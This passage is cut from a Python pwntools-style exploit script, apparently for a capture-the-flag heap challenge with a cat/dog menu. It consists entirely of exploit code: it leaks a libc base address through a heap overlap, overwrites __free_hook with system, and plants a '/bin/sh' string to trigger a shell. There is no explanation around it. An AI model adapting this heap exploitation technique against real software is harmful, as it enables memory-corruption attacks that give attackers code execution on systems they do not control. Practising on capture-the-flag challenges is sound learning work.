...
create(1, 0, 10, b'a'*0x428)
manage_select(1, 0)
create(1, 0, 10, b'a'*0x20)
create(0, 0, 10, b'a'*0x20)
manage_add_age(1, 0xc0)
show(0, 0)
ru(b'name:')
libc_base = uu64(rn(8)) - 0x1ecbe0
lg("libc_base")

create(1, 1, 10, b'b'*0x30)
manage_select(1, 1)
create(1, 1, 10, b'c'*0x30)
manage_name(1, p64(libc_base + l.symbols['__free_hook'] - 0x18).replace(b'\x00', b''))
create(1, 2, 10)
create(1, 3, 10, b'/bin/sh\x00'.ljust(0x60, b'a'))
create(0, 4, 10, p64(libc_base + l.symbols['system']))
cmd(1)
ru(b'cat or dog?\n')
sl(b'dog')
ru(b'index:\n')
